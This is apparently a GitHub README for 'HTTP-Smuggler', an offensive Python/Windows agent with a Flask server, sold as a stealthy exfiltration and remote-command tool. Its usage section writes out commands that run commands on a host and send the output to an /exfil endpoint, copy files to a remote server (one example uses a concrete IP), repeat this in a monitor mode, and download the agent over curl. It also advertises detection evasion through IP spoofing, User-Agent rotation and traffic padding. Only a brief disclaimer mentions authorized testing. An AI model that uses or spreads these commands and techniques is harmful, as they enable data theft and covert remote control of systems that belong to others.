# HTTP-Smuggler

![Python](https://img.shields.io/badge/python-3.6%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-lightgrey)

Covert HTTP smuggling tool for stealthy data exfiltration and command execution, specifically optimized for reliable Remote Code Execution (RCE) operations. The agent evades detection through chunked encoding and traffic spoofing techniques while maintaining robust command-and-control connectivity. Designed for red team engagements, it supports both immediate task execution and persistent monitoring modes. The Flask server securely collects and isolates payloads with proper logging for operational security.

## Features

- **Stealthy Data Exfiltration**: Files are transferred using chunked encoding and base64 obfuscation
- **Command Execution**: Remote command execution with results exfiltrated to server
- **Monitor Mode**: Repeated command execution at specified intervals
- **Multiple Delivery Options**:
  - Python script (cross-platform)
  - Standalone Windows executable (client.exe)
- **Evasion Techniques**:
  - Random User-Agent rotation
  - IP spoofing via X-Forwarded-For
  - Request size variation with random padding
  - Randomized delay between requests
- **Server Component**: Flask-based receiver with proper data handling

## Components

### Client Options
1. **Python Script (`client.py`)**
   - Cross-platform (Windows/Linux/macOS)
   - Requires Python environment

2. **Standalone Executable (`client.exe`)**
   - Windows-only compiled version
   - Same command structure as Python script
   - No Python installation required

### Server (`server.py`)
- Flask-based receiver endpoint
- Handles both command output and file uploads
- Stores received data with timestamps
- Includes basic security measures
- The server can deliver the client agent for easy deployment. For example using `curl http://server-ip/client.py`

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Mattb709/HTTP-Smuggler.git
   cd HTTP-Smuggler
   ```

2. For Python version, install dependencies:
   ```bash
   pip install flask requests
   ```

## Usage

### Server Setup
```bash
python server.py
```

### Client Operations

**Using Python script:**
```bash
python client.py -c "whoami" -s http://your-server.com/exfil
```
**Using Windows executable:**
```cmd
client.exe -f newtest.txt -s http://142.134.220.83:80/exfil
```
*Note: The `/exfil` endpoint can be easily renamed for operational security.*

**Execute a single command:**
```bash
python client.py -c "whoami" -s http://your-server.com/exfil
# OR
client.exe -c "whoami" -s http://your-server.com/exfil
```

**Exfiltrate a file:**
```bash
python client.py -f /path/to/file -s http://your-server.com/exfil
# OR
client.exe -f C:\path\to\file -s http://your-server.com/exfil
```

**Monitor mode (repeated execution):**
```bash
python client.py -c "netstat -ant" -s http://your-server.com/exfil -m -t 5
# OR
client.exe -c "netstat -ant" -s http://your-server.com/exfil -m -t 5
```
(Executes every 5 minutes)

## Options

| Flag | Description                                  | Required |
|------|----------------------------------------------|----------|
| -c   | Command to execute                           | Optional |
| -f   | File to exfiltrate                           | Optional |
| -s   | Server URL (default: http://mydomain.com/exfil) | No       |
| -m   | Enable monitor mode                          | No       |
| -t   | Time interval in minutes for monitor mode    | With -m  |

*Note: Options work identically in both Python script and compiled executable versions*

## Legal Disclaimer

This tool is provided for educational and authorized testing purposes only. The author is not responsible for any misuse or damage caused by this software. Always obtain proper authorization before testing any systems.

## License

MIT License - See [LICENSE](LICENSE) for details.

## Sample Images

**Server.py deployment and interaction from client:**
![img1](https://github.com/user-attachments/assets/235b8335-7e6c-42ed-9035-efa2a86baa37)
**Client.py operations:**
![img2](https://github.com/user-attachments/assets/a0a8b948-5d3a-4e88-a804-65a195620e1f)
